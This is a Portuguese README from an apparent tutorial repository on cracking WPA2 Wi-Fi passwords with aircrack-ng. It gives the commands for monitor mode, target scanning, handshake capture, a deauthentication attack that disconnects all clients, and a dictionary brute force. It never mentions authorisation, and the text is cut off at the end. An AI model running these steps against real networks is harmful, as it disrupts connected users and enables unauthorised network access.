# aicrack-ng
***Quebrando senhas WPA2 com AIRCRACK-NG***

Nesse repósitorio você irá descubrir cada etapa para utilizar o aircrack-ng, uma excelente ferramenta para quebra de senha no modo força bruta utilizando dicionarios.

Antes de começarmos é indispensável você ter um adaptador de rede e segundo coloca-lo em modo monitor.

1- airmon-ng check kill | Esse comando irá matar todos os processos que possa vim a conflitar durante o processo de quebra.

2- airmon-ng start wlan0 | Esse comando ira colocar a placa em modo monitor.

3- airodump-ng wlan0 | Esse comando irá iniciar a busca por todos os Aps disponiveis. Os que estão por ultimo geralmente são os que estão mais próximos de você.

4- airodump-ng wlan0 -d 78:98:E8:DC:7D:A6 | - aonde entrou o 78:98:E8:DC:7D:A6 é aonde irá entrar o bssid do seu alvo, substitua - Esse comando irá identificar se há algum host conectado nessa estação (ap) caso não haja não será possível o ataque.

5-airodump-ng -w hack1 -c 2 --bssid 78:98:E8:DC:7D:A6 wlan0 |

5.1 Após isso abra mais um terminal e execute o proximo processo

6- aireplay-ng --deauth 0 -a 78:98:E8:DC:7D:A6 wlan0 | Irá gerar um ataque de negação para o (ap) alvo após isso todos os hosts serão desconectados e quando eles tentarem se conectar você obtera o handshake. O handshake aparece no terminal do processo n° 5

7 - aircrack-ng hack1-01.cap -w numeros.txt | Esse comando irá iniciar um ataque de força bruta com dicionario.

-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=--=-=-=-=-=

-numeros.txt = É uma lista de senha criadas atráves do programa crunch
-wlan0 = É o nome do meu adaptador de rede o seu pode ser diferente.
-78:98:E8:DC:7D:A6 = É o nome do bssid do meu alvo do seu será diferente não copie
-hack1 = É onde o arquivo cap será projetado, mas o nome é opcional p
